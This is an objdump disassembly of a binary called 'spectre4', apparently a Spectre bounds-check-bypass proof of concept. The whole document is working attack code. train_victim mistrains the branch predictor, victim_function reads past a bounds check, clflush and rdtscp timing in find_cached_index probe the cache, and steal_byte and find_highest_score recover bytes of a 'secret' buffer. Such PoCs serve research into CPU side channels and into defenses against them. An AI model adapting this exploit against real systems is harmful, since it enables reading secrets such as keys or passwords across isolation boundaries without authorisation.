
spectre4:     file format elf64-x86-64


Disassembly of section .init:

00000000000006b0 <_init>:
 6b0:	48 83 ec 08          	sub    $0x8,%rsp
 6b4:	48 8b 05 2d 19 20 00 	mov    0x20192d(%rip),%rax        # 201fe8 <__gmon_start__>
 6bb:	48 85 c0             	test   %rax,%rax
 6be:	74 02                	je     6c2 <_init+0x12>
 6c0:	ff d0                	callq  *%rax
 6c2:	48 83 c4 08          	add    $0x8,%rsp
 6c6:	c3                   	retq   

Disassembly of section .plt:

00000000000006d0 <.plt>:
 6d0:	ff 35 b2 18 20 00    	pushq  0x2018b2(%rip)        # 201f88 <_GLOBAL_OFFSET_TABLE_+0x8>
 6d6:	ff 25 b4 18 20 00    	jmpq   *0x2018b4(%rip)        # 201f90 <_GLOBAL_OFFSET_TABLE_+0x10>
 6dc:	0f 1f 40 00          	nopl   0x0(%rax)

00000000000006e0 <sigprocmask@plt>:
 6e0:	ff 25 b2 18 20 00    	jmpq   *0x2018b2(%rip)        # 201f98 <sigprocmask@GLIBC_2.2.5>
 6e6:	68 00 00 00 00       	pushq  $0x0
 6eb:	e9 e0 ff ff ff       	jmpq   6d0 <.plt>

00000000000006f0 <free@plt>:
 6f0:	ff 25 aa 18 20 00    	jmpq   *0x2018aa(%rip)        # 201fa0 <free@GLIBC_2.2.5>
 6f6:	68 01 00 00 00       	pushq  $0x1
 6fb:	e9 d0 ff ff ff       	jmpq   6d0 <.plt>

0000000000000700 <__stack_chk_fail@plt>:
 700:	ff 25 a2 18 20 00    	jmpq   *0x2018a2(%rip)        # 201fa8 <__stack_chk_fail@GLIBC_2.4>
 706:	68 02 00 00 00       	pushq  $0x2
 70b:	e9 c0 ff ff ff       	jmpq   6d0 <.plt>

0000000000000710 <printf@plt>:
 710:	ff 25 9a 18 20 00    	jmpq   *0x20189a(%rip)        # 201fb0 <printf@GLIBC_2.2.5>
 716:	68 03 00 00 00       	pushq  $0x3
 71b:	e9 b0 ff ff ff       	jmpq   6d0 <.plt>

0000000000000720 <sigemptyset@plt>:
 720:	ff 25 92 18 20 00    	jmpq   *0x201892(%rip)        # 201fb8 <sigemptyset@GLIBC_2.2.5>
 726:	68 04 00 00 00       	pushq  $0x4
 72b:	e9 a0 ff ff ff       	jmpq   6d0 <.plt>

0000000000000730 <malloc@plt>:
 730:	ff 25 8a 18 20 00    	jmpq   *0x20188a(%rip)        # 201fc0 <malloc@GLIBC_2.2.5>
 736:	68 05 00 00 00       	pushq  $0x5
 73b:	e9 90 ff ff ff       	jmpq   6d0 <.plt>

0000000000000740 <longjmp@plt>:
 740:	ff 25 82 18 20 00    	jmpq   *0x201882(%rip)        # 201fc8 <longjmp@GLIBC_2.2.5>
 746:	68 06 00 00 00       	pushq  $0x6
 74b:	e9 80 ff ff ff       	jmpq   6d0 <.plt>

0000000000000750 <sigaddset@plt>:
 750:	ff 25 7a 18 20 00    	jmpq   *0x20187a(%rip)        # 201fd0 <sigaddset@GLIBC_2.2.5>
 756:	68 07 00 00 00       	pushq  $0x7
 75b:	e9 70 ff ff ff       	jmpq   6d0 <.plt>

Disassembly of section .plt.got:

0000000000000760 <__cxa_finalize@plt>:
 760:	ff 25 92 18 20 00    	jmpq   *0x201892(%rip)        # 201ff8 <__cxa_finalize@GLIBC_2.2.5>
 766:	66 90                	xchg   %ax,%ax

Disassembly of section .text:

0000000000000770 <_start>:
 770:	31 ed                	xor    %ebp,%ebp
 772:	49 89 d1             	mov    %rdx,%r9
 775:	5e                   	pop    %rsi
 776:	48 89 e2             	mov    %rsp,%rdx
 779:	48 83 e4 f0          	and    $0xfffffffffffffff0,%rsp
 77d:	50                   	push   %rax
 77e:	54                   	push   %rsp
 77f:	4c 8d 05 da 05 00 00 	lea    0x5da(%rip),%r8        # d60 <__libc_csu_fini>
 786:	48 8d 0d 63 05 00 00 	lea    0x563(%rip),%rcx        # cf0 <__libc_csu_init>
 78d:	48 8d 3d e6 00 00 00 	lea    0xe6(%rip),%rdi        # 87a <main>
 794:	ff 15 46 18 20 00    	callq  *0x201846(%rip)        # 201fe0 <__libc_start_main@GLIBC_2.2.5>
 79a:	f4                   	hlt    
 79b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)

00000000000007a0 <deregister_tm_clones>:
 7a0:	48 8d 3d 69 19 20 00 	lea    0x201969(%rip),%rdi        # 202110 <__TMC_END__>
 7a7:	55                   	push   %rbp
 7a8:	48 8d 05 61 19 20 00 	lea    0x201961(%rip),%rax        # 202110 <__TMC_END__>
 7af:	48 39 f8             	cmp    %rdi,%rax
 7b2:	48 89 e5             	mov    %rsp,%rbp
 7b5:	74 19                	je     7d0 <deregister_tm_clones+0x30>
 7b7:	48 8b 05 1a 18 20 00 	mov    0x20181a(%rip),%rax        # 201fd8 <_ITM_deregisterTMCloneTable>
 7be:	48 85 c0             	test   %rax,%rax
 7c1:	74 0d                	je     7d0 <deregister_tm_clones+0x30>
 7c3:	5d                   	pop    %rbp
 7c4:	ff e0                	jmpq   *%rax
 7c6:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
 7cd:	00 00 00 
 7d0:	5d                   	pop    %rbp
 7d1:	c3                   	retq   
 7d2:	0f 1f 40 00          	nopl   0x0(%rax)
 7d6:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
 7dd:	00 00 00 

00000000000007e0 <register_tm_clones>:
 7e0:	48 8d 3d 29 19 20 00 	lea    0x201929(%rip),%rdi        # 202110 <__TMC_END__>
 7e7:	48 8d 35 22 19 20 00 	lea    0x201922(%rip),%rsi        # 202110 <__TMC_END__>
 7ee:	55                   	push   %rbp
 7ef:	48 29 fe             	sub    %rdi,%rsi
 7f2:	48 89 e5             	mov    %rsp,%rbp
 7f5:	48 c1 fe 03          	sar    $0x3,%rsi
 7f9:	48 89 f0             	mov    %rsi,%rax
 7fc:	48 c1 e8 3f          	shr    $0x3f,%rax
 800:	48 01 c6             	add    %rax,%rsi
 803:	48 d1 fe             	sar    %rsi
 806:	74 18                	je     820 <register_tm_clones+0x40>
 808:	48 8b 05 e1 17 20 00 	mov    0x2017e1(%rip),%rax        # 201ff0 <_ITM_registerTMCloneTable>
 80f:	48 85 c0             	test   %rax,%rax
 812:	74 0c                	je     820 <register_tm_clones+0x40>
 814:	5d                   	pop    %rbp
 815:	ff e0                	jmpq   *%rax
 817:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
 81e:	00 00 
 820:	5d                   	pop    %rbp
 821:	c3                   	retq   
 822:	0f 1f 40 00          	nopl   0x0(%rax)
 826:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
 82d:	00 00 00 

0000000000000830 <__do_global_dtors_aux>:
 830:	80 3d e9 18 20 00 00 	cmpb   $0x0,0x2018e9(%rip)        # 202120 <completed.7697>
 837:	75 2f                	jne    868 <__do_global_dtors_aux+0x38>
 839:	48 83 3d b7 17 20 00 	cmpq   $0x0,0x2017b7(%rip)        # 201ff8 <__cxa_finalize@GLIBC_2.2.5>
 840:	00 
 841:	55                   	push   %rbp
 842:	48 89 e5             	mov    %rsp,%rbp
 845:	74 0c                	je     853 <__do_global_dtors_aux+0x23>
 847:	48 8b 3d ba 17 20 00 	mov    0x2017ba(%rip),%rdi        # 202008 <__dso_handle>
 84e:	e8 0d ff ff ff       	callq  760 <__cxa_finalize@plt>
 853:	e8 48 ff ff ff       	callq  7a0 <deregister_tm_clones>
 858:	c6 05 c1 18 20 00 01 	movb   $0x1,0x2018c1(%rip)        # 202120 <completed.7697>
 85f:	5d                   	pop    %rbp
 860:	c3                   	retq   
 861:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
 868:	f3 c3                	repz retq 
 86a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)

0000000000000870 <frame_dummy>:
 870:	55                   	push   %rbp
 871:	48 89 e5             	mov    %rsp,%rbp
 874:	5d                   	pop    %rbp
 875:	e9 66 ff ff ff       	jmpq   7e0 <register_tm_clones>

000000000000087a <main>:
 87a:	55                   	push   %rbp
 87b:	48 89 e5             	mov    %rsp,%rbp
 87e:	48 83 ec 20          	sub    $0x20,%rsp
 882:	c7 45 e0 00 00 00 00 	movl   $0x0,-0x20(%rbp)
 889:	eb 24                	jmp    8af <main+0x35>
 88b:	8b 45 e0             	mov    -0x20(%rbp),%eax
 88e:	99                   	cltd   
 88f:	c1 ea 18             	shr    $0x18,%edx
 892:	01 d0                	add    %edx,%eax
 894:	0f b6 c0             	movzbl %al,%eax
 897:	29 d0                	sub    %edx,%eax
 899:	89 c1                	mov    %eax,%ecx
 89b:	8b 45 e0             	mov    -0x20(%rbp),%eax
 89e:	48 63 d0             	movslq %eax,%rdx
 8a1:	48 8d 05 98 19 20 00 	lea    0x201998(%rip),%rax        # 202240 <array>
 8a8:	88 0c 02             	mov    %cl,(%rdx,%rax,1)
 8ab:	83 45 e0 01          	addl   $0x1,-0x20(%rbp)
 8af:	81 7d e0 ff ff 0f 00 	cmpl   $0xfffff,-0x20(%rbp)
 8b6:	7e d3                	jle    88b <main+0x11>
 8b8:	c7 45 e4 00 00 00 00 	movl   $0x0,-0x1c(%rbp)
 8bf:	e9 b1 00 00 00       	jmpq   975 <main+0xfb>
 8c4:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%rbp)
 8cb:	eb 1a                	jmp    8e7 <main+0x6d>
 8cd:	8b 45 e8             	mov    -0x18(%rbp),%eax
 8d0:	c1 e0 0c             	shl    $0xc,%eax
 8d3:	48 63 d0             	movslq %eax,%rdx
 8d6:	48 8d 05 63 19 20 00 	lea    0x201963(%rip),%rax        # 202240 <array>
 8dd:	48 01 d0             	add    %rdx,%rax
 8e0:	0f ae 38             	clflush (%rax)
 8e3:	83 45 e8 01          	addl   $0x1,-0x18(%rbp)
 8e7:	81 7d e8 ff 00 00 00 	cmpl   $0xff,-0x18(%rbp)
 8ee:	7e dd                	jle    8cd <main+0x53>
 8f0:	0f ae f0             	mfence 
 8f3:	bf 00 04 00 00       	mov    $0x400,%edi
 8f8:	e8 33 fe ff ff       	callq  730 <malloc@plt>
 8fd:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
 901:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%rbp)
 908:	eb 1e                	jmp    928 <main+0xae>
 90a:	8b 45 ec             	mov    -0x14(%rbp),%eax
 90d:	48 98                	cltq   
 90f:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 916:	00 
 917:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
 91b:	48 01 d0             	add    %rdx,%rax
 91e:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
 924:	83 45 ec 01          	addl   $0x1,-0x14(%rbp)
 928:	81 7d ec ff 00 00 00 	cmpl   $0xff,-0x14(%rbp)
 92f:	7e d9                	jle    90a <main+0x90>
 931:	8b 45 e4             	mov    -0x1c(%rbp),%eax
 934:	48 98                	cltq   
 936:	48 8d 0d a3 17 20 00 	lea    0x2017a3(%rip),%rcx        # 2020e0 <secret>
 93d:	48 8d 15 fc 16 20 00 	lea    0x2016fc(%rip),%rdx        # 202040 <buffer>
 944:	48 29 d1             	sub    %rdx,%rcx
 947:	48 89 ca             	mov    %rcx,%rdx
 94a:	48 01 d0             	add    %rdx,%rax
 94d:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
 951:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
 955:	89 c2                	mov    %eax,%edx
 957:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
 95b:	89 d6                	mov    %edx,%esi
 95d:	48 89 c7             	mov    %rax,%rdi
 960:	e8 c6 02 00 00       	callq  c2b <steal_byte>
 965:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
 969:	48 89 c7             	mov    %rax,%rdi
 96c:	e8 7f fd ff ff       	callq  6f0 <free@plt>
 971:	83 45 e4 01          	addl   $0x1,-0x1c(%rbp)
 975:	83 7d e4 27          	cmpl   $0x27,-0x1c(%rbp)
 979:	0f 8e 45 ff ff ff    	jle    8c4 <main+0x4a>
 97f:	b8 00 00 00 00       	mov    $0x0,%eax
 984:	c9                   	leaveq 
 985:	c3                   	retq   

0000000000000986 <unblock_signal>:
 986:	55                   	push   %rbp
 987:	48 89 e5             	mov    %rsp,%rbp
 98a:	48 81 ec a0 00 00 00 	sub    $0xa0,%rsp
 991:	89 bd 6c ff ff ff    	mov    %edi,-0x94(%rbp)
 997:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
 99e:	00 00 
 9a0:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
 9a4:	31 c0                	xor    %eax,%eax
 9a6:	48 8d 85 70 ff ff ff 	lea    -0x90(%rbp),%rax
 9ad:	48 89 c7             	mov    %rax,%rdi
 9b0:	e8 6b fd ff ff       	callq  720 <sigemptyset@plt>
 9b5:	8b 95 6c ff ff ff    	mov    -0x94(%rbp),%edx
 9bb:	48 8d 85 70 ff ff ff 	lea    -0x90(%rbp),%rax
 9c2:	89 d6                	mov    %edx,%esi
 9c4:	48 89 c7             	mov    %rax,%rdi
 9c7:	e8 84 fd ff ff       	callq  750 <sigaddset@plt>
 9cc:	48 8d 85 70 ff ff ff 	lea    -0x90(%rbp),%rax
 9d3:	ba 00 00 00 00       	mov    $0x0,%edx
 9d8:	48 89 c6             	mov    %rax,%rsi
 9db:	bf 01 00 00 00       	mov    $0x1,%edi
 9e0:	e8 fb fc ff ff       	callq  6e0 <sigprocmask@plt>
 9e5:	90                   	nop
 9e6:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
 9ea:	64 48 33 04 25 28 00 	xor    %fs:0x28,%rax
 9f1:	00 00 
 9f3:	74 05                	je     9fa <unblock_signal+0x74>
 9f5:	e8 06 fd ff ff       	callq  700 <__stack_chk_fail@plt>
 9fa:	c9                   	leaveq 
 9fb:	c3                   	retq   

00000000000009fc <trycatch_segfault_handler>:
 9fc:	55                   	push   %rbp
 9fd:	48 89 e5             	mov    %rsp,%rbp
 a00:	48 83 ec 10          	sub    $0x10,%rsp
 a04:	89 7d fc             	mov    %edi,-0x4(%rbp)
 a07:	bf 0b 00 00 00       	mov    $0xb,%edi
 a0c:	e8 75 ff ff ff       	callq  986 <unblock_signal>
 a11:	bf 08 00 00 00       	mov    $0x8,%edi
 a16:	e8 6b ff ff ff       	callq  986 <unblock_signal>
 a1b:	be 01 00 00 00       	mov    $0x1,%esi
 a20:	48 8d 3d 39 17 20 00 	lea    0x201739(%rip),%rdi        # 202160 <trycatch_buf>
 a27:	e8 14 fd ff ff       	callq  740 <longjmp@plt>

0000000000000a2c <find_cached_index>:
 a2c:	55                   	push   %rbp
 a2d:	48 89 e5             	mov    %rsp,%rbp
 a30:	53                   	push   %rbx
 a31:	48 89 7d e0          	mov    %rdi,-0x20(%rbp)
 a35:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%rbp)
 a3c:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%rbp)
 a43:	eb 67                	jmp    aac <find_cached_index+0x80>
 a45:	48 c7 45 f0 00 00 00 	movq   $0x0,-0x10(%rbp)
 a4c:	00 
 a4d:	8b 45 e8             	mov    -0x18(%rbp),%eax
 a50:	c1 e0 0c             	shl    $0xc,%eax
 a53:	48 63 d0             	movslq %eax,%rdx
 a56:	48 8d 05 e3 17 20 00 	lea    0x2017e3(%rip),%rax        # 202240 <array>
 a5d:	48 01 d0             	add    %rdx,%rax
 a60:	48 89 c3             	mov    %rax,%rbx
 a63:	0f ae f0             	mfence 
 a66:	0f 01 f9             	rdtscp 
 a69:	49 89 c2             	mov    %rax,%r10
 a6c:	48 8b 0b             	mov    (%rbx),%rcx
 a6f:	0f 01 f9             	rdtscp 
 a72:	4c 29 d0             	sub    %r10,%rax
 a75:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
 a79:	48 83 7d f0 77       	cmpq   $0x77,-0x10(%rbp)
 a7e:	77 28                	ja     aa8 <find_cached_index+0x7c>
 a80:	83 7d e8 00          	cmpl   $0x0,-0x18(%rbp)
 a84:	74 07                	je     a8d <find_cached_index+0x61>
 a86:	c7 45 ec 01 00 00 00 	movl   $0x1,-0x14(%rbp)
 a8d:	8b 45 e8             	mov    -0x18(%rbp),%eax
 a90:	48 98                	cltq   
 a92:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 a99:	00 
 a9a:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
 a9e:	48 01 d0             	add    %rdx,%rax
 aa1:	8b 10                	mov    (%rax),%edx
 aa3:	83 c2 01             	add    $0x1,%edx
 aa6:	89 10                	mov    %edx,(%rax)
 aa8:	83 45 e8 01          	addl   $0x1,-0x18(%rbp)
 aac:	81 7d e8 ff 00 00 00 	cmpl   $0xff,-0x18(%rbp)
 ab3:	7e 90                	jle    a45 <find_cached_index+0x19>
 ab5:	8b 45 ec             	mov    -0x14(%rbp),%eax
 ab8:	5b                   	pop    %rbx
 ab9:	5d                   	pop    %rbp
 aba:	c3                   	retq   

0000000000000abb <find_highest_score>:
 abb:	55                   	push   %rbp
 abc:	48 89 e5             	mov    %rsp,%rbp
 abf:	48 83 ec 30          	sub    $0x30,%rsp
 ac3:	48 89 7d d8          	mov    %rdi,-0x28(%rbp)
 ac7:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%rbp)
 ace:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%rbp)
 ad5:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%rbp)
 adc:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%rbp)
 ae3:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%rbp)
 aea:	eb 4a                	jmp    b36 <find_highest_score+0x7b>
 aec:	8b 45 fc             	mov    -0x4(%rbp),%eax
 aef:	48 98                	cltq   
 af1:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 af8:	00 
 af9:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
 afd:	48 01 d0             	add    %rdx,%rax
 b00:	8b 00                	mov    (%rax),%eax
 b02:	39 45 ec             	cmp    %eax,-0x14(%rbp)
 b05:	7d 2b                	jge    b32 <find_highest_score+0x77>
 b07:	8b 45 f0             	mov    -0x10(%rbp),%eax
 b0a:	89 45 f8             	mov    %eax,-0x8(%rbp)
 b0d:	8b 45 ec             	mov    -0x14(%rbp),%eax
 b10:	89 45 f4             	mov    %eax,-0xc(%rbp)
 b13:	8b 45 fc             	mov    -0x4(%rbp),%eax
 b16:	89 45 f0             	mov    %eax,-0x10(%rbp)
 b19:	8b 45 fc             	mov    -0x4(%rbp),%eax
 b1c:	48 98                	cltq   
 b1e:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 b25:	00 
 b26:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
 b2a:	48 01 d0             	add    %rdx,%rax
 b2d:	8b 00                	mov    (%rax),%eax
 b2f:	89 45 ec             	mov    %eax,-0x14(%rbp)
 b32:	83 45 fc 01          	addl   $0x1,-0x4(%rbp)
 b36:	81 7d fc ff 00 00 00 	cmpl   $0xff,-0x4(%rbp)
 b3d:	7e ad                	jle    aec <find_highest_score+0x31>
 b3f:	8b 7d f4             	mov    -0xc(%rbp),%edi
 b42:	8b 75 f8             	mov    -0x8(%rbp),%esi
 b45:	8b 4d ec             	mov    -0x14(%rbp),%ecx
 b48:	8b 55 f0             	mov    -0x10(%rbp),%edx
 b4b:	8b 45 f0             	mov    -0x10(%rbp),%eax
 b4e:	41 89 f9             	mov    %edi,%r9d
 b51:	41 89 f0             	mov    %esi,%r8d
 b54:	89 c6                	mov    %eax,%esi
 b56:	48 8d 3d 1b 02 00 00 	lea    0x21b(%rip),%rdi        # d78 <_IO_stdin_used+0x8>
 b5d:	b8 00 00 00 00       	mov    $0x0,%eax
 b62:	e8 a9 fb ff ff       	callq  710 <printf@plt>
 b67:	90                   	nop
 b68:	c9                   	leaveq 
 b69:	c3                   	retq   

0000000000000b6a <train_victim>:
 b6a:	55                   	push   %rbp
 b6b:	48 89 e5             	mov    %rsp,%rbp
 b6e:	48 83 ec 10          	sub    $0x10,%rsp
 b72:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%rbp)
 b79:	eb 6b                	jmp    be6 <train_victim+0x7c>
 b7b:	8b 4d f4             	mov    -0xc(%rbp),%ecx
 b7e:	ba 67 66 66 66       	mov    $0x66666667,%edx
 b83:	89 c8                	mov    %ecx,%eax
 b85:	f7 ea                	imul   %edx
 b87:	c1 fa 02             	sar    $0x2,%edx
 b8a:	89 c8                	mov    %ecx,%eax
 b8c:	c1 f8 1f             	sar    $0x1f,%eax
 b8f:	29 c2                	sub    %eax,%edx
 b91:	89 d0                	mov    %edx,%eax
 b93:	c1 e0 02             	shl    $0x2,%eax
 b96:	01 d0                	add    %edx,%eax
 b98:	01 c0                	add    %eax,%eax
 b9a:	29 c1                	sub    %eax,%ecx
 b9c:	89 ca                	mov    %ecx,%edx
 b9e:	48 63 c2             	movslq %edx,%rax
 ba1:	48 89 c7             	mov    %rax,%rdi
 ba4:	e8 f5 00 00 00       	callq  c9e <victim_function>
 ba9:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%rbp)
 bb0:	eb 1a                	jmp    bcc <train_victim+0x62>
 bb2:	8b 45 f8             	mov    -0x8(%rbp),%eax
 bb5:	c1 e0 0c             	shl    $0xc,%eax
 bb8:	48 63 d0             	movslq %eax,%rdx
 bbb:	48 8d 05 7e 16 20 00 	lea    0x20167e(%rip),%rax        # 202240 <array>
 bc2:	48 01 d0             	add    %rdx,%rax
 bc5:	0f ae 38             	clflush (%rax)
 bc8:	83 45 f8 01          	addl   $0x1,-0x8(%rbp)
 bcc:	81 7d f8 ff 00 00 00 	cmpl   $0xff,-0x8(%rbp)
 bd3:	7e dd                	jle    bb2 <train_victim+0x48>
 bd5:	0f ae f0             	mfence 
 bd8:	48 8d 05 41 14 20 00 	lea    0x201441(%rip),%rax        # 202020 <bufferSize>
 bdf:	0f ae 38             	clflush (%rax)
 be2:	83 45 f4 01          	addl   $0x1,-0xc(%rbp)
 be6:	83 7d f4 13          	cmpl   $0x13,-0xc(%rbp)
 bea:	7e 8f                	jle    b7b <train_victim+0x11>
 bec:	0f ae e8             	lfence 
 bef:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%rbp)
 bf6:	eb 1a                	jmp    c12 <train_victim+0xa8>
 bf8:	8b 45 fc             	mov    -0x4(%rbp),%eax
 bfb:	c1 e0 0c             	shl    $0xc,%eax
 bfe:	48 63 d0             	movslq %eax,%rdx
 c01:	48 8d 05 38 16 20 00 	lea    0x201638(%rip),%rax        # 202240 <array>
 c08:	48 01 d0             	add    %rdx,%rax
 c0b:	0f ae 38             	clflush (%rax)
 c0e:	83 45 fc 01          	addl   $0x1,-0x4(%rbp)
 c12:	81 7d fc ff 00 00 00 	cmpl   $0xff,-0x4(%rbp)
 c19:	7e dd                	jle    bf8 <train_victim+0x8e>
 c1b:	0f ae f0             	mfence 
 c1e:	48 8d 05 fb 13 20 00 	lea    0x2013fb(%rip),%rax        # 202020 <bufferSize>
 c25:	0f ae 38             	clflush (%rax)
 c28:	90                   	nop
 c29:	c9                   	leaveq 
 c2a:	c3                   	retq   

0000000000000c2b <steal_byte>:
 c2b:	55                   	push   %rbp
 c2c:	48 89 e5             	mov    %rsp,%rbp
 c2f:	48 83 ec 20          	sub    $0x20,%rsp
 c33:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
 c37:	89 75 e4             	mov    %esi,-0x1c(%rbp)
 c3a:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%rbp)
 c41:	eb 43                	jmp    c86 <steal_byte+0x5b>
 c43:	b8 00 00 00 00       	mov    $0x0,%eax
 c48:	e8 1d ff ff ff       	callq  b6a <train_victim>
 c4d:	8b 45 e4             	mov    -0x1c(%rbp),%eax
 c50:	d1 f8                	sar    %eax
 c52:	48 98                	cltq   
 c54:	48 89 c7             	mov    %rax,%rdi
 c57:	e8 42 00 00 00       	callq  c9e <victim_function>
 c5c:	8b 45 e4             	mov    -0x1c(%rbp),%eax
 c5f:	48 98                	cltq   
 c61:	48 89 c7             	mov    %rax,%rdi
 c64:	e8 35 00 00 00       	callq  c9e <victim_function>
 c69:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
 c6d:	48 89 c7             	mov    %rax,%rdi
 c70:	e8 b7 fd ff ff       	callq  a2c <find_cached_index>
 c75:	89 45 fc             	mov    %eax,-0x4(%rbp)
 c78:	83 7d fc 00          	cmpl   $0x0,-0x4(%rbp)
 c7c:	75 04                	jne    c82 <steal_byte+0x57>
 c7e:	83 6d f8 01          	subl   $0x1,-0x8(%rbp)
 c82:	83 45 f8 01          	addl   $0x1,-0x8(%rbp)
 c86:	81 7d f8 e7 03 00 00 	cmpl   $0x3e7,-0x8(%rbp)
 c8d:	7e b4                	jle    c43 <steal_byte+0x18>
 c8f:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
 c93:	48 89 c7             	mov    %rax,%rdi
 c96:	e8 20 fe ff ff       	callq  abb <find_highest_score>
 c9b:	90                   	nop
 c9c:	c9                   	leaveq 
 c9d:	c3                   	retq   

0000000000000c9e <victim_function>:
 c9e:	55                   	push   %rbp
 c9f:	48 89 e5             	mov    %rsp,%rbp
 ca2:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
 ca6:	8b 05 74 13 20 00    	mov    0x201374(%rip),%eax        # 202020 <bufferSize>
 cac:	48 98                	cltq   
 cae:	48 39 45 f8          	cmp    %rax,-0x8(%rbp)
 cb2:	73 36                	jae    cea <victim_function+0x4c>
 cb4:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
 cb8:	48 8d 14 00          	lea    (%rax,%rax,1),%rdx
 cbc:	48 8d 05 7d 13 20 00 	lea    0x20137d(%rip),%rax        # 202040 <buffer>
 cc3:	0f b6 04 02          	movzbl (%rdx,%rax,1),%eax
 cc7:	0f b6 c0             	movzbl %al,%eax
 cca:	c1 e0 0c             	shl    $0xc,%eax
 ccd:	48 63 d0             	movslq %eax,%rdx
 cd0:	48 8d 05 69 15 20 00 	lea    0x201569(%rip),%rax        # 202240 <array>
 cd7:	0f b6 14 02          	movzbl (%rdx,%rax,1),%edx
 cdb:	0f b6 05 5e 14 20 00 	movzbl 0x20145e(%rip),%eax        # 202140 <temp>
 ce2:	21 d0                	and    %edx,%eax
 ce4:	88 05 56 14 20 00    	mov    %al,0x201456(%rip)        # 202140 <temp>
 cea:	90                   	nop
 ceb:	5d                   	pop    %rbp
 cec:	c3                   	retq   
 ced:	0f 1f 00             	nopl   (%rax)

0000000000000cf0 <__libc_csu_init>:
 cf0:	41 57                	push   %r15
 cf2:	41 56                	push   %r14
 cf4:	49 89 d7             	mov    %rdx,%r15
 cf7:	41 55                	push   %r13
 cf9:	41 54                	push   %r12
 cfb:	4c 8d 25 7e 10 20 00 	lea    0x20107e(%rip),%r12        # 201d80 <__frame_dummy_init_array_entry>
 d02:	55                   	push   %rbp
 d03:	48 8d 2d 7e 10 20 00 	lea    0x20107e(%rip),%rbp        # 201d88 <__init_array_end>
 d0a:	53                   	push   %rbx
 d0b:	41 89 fd             	mov    %edi,%r13d
 d0e:	49 89 f6             	mov    %rsi,%r14
 d11:	4c 29 e5             	sub    %r12,%rbp
 d14:	48 83 ec 08          	sub    $0x8,%rsp
 d18:	48 c1 fd 03          	sar    $0x3,%rbp
 d1c:	e8 8f f9 ff ff       	callq  6b0 <_init>
 d21:	48 85 ed             	test   %rbp,%rbp
 d24:	74 20                	je     d46 <__libc_csu_init+0x56>
 d26:	31 db                	xor    %ebx,%ebx
 d28:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
 d2f:	00 
 d30:	4c 89 fa             	mov    %r15,%rdx
 d33:	4c 89 f6             	mov    %r14,%rsi
 d36:	44 89 ef             	mov    %r13d,%edi
 d39:	41 ff 14 dc          	callq  *(%r12,%rbx,8)
 d3d:	48 83 c3 01          	add    $0x1,%rbx
 d41:	48 39 dd             	cmp    %rbx,%rbp
 d44:	75 ea                	jne    d30 <__libc_csu_init+0x40>
 d46:	48 83 c4 08          	add    $0x8,%rsp
 d4a:	5b                   	pop    %rbx
 d4b:	5d                   	pop    %rbp
 d4c:	41 5c                	pop    %r12
 d4e:	41 5d                	pop    %r13
 d50:	41 5e                	pop    %r14
 d52:	41 5f                	pop    %r15
 d54:	c3                   	retq   
 d55:	90                   	nop
 d56:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
 d5d:	00 00 00 

0000000000000d60 <__libc_csu_fini>:
 d60:	f3 c3                	repz retq 

Disassembly of section .fini:

0000000000000d64 <_fini>:
 d64:	48 83 ec 08          	sub    $0x8,%rsp
 d68:	48 83 c4 08          	add    $0x8,%rsp
 d6c:	c3                   	retq   
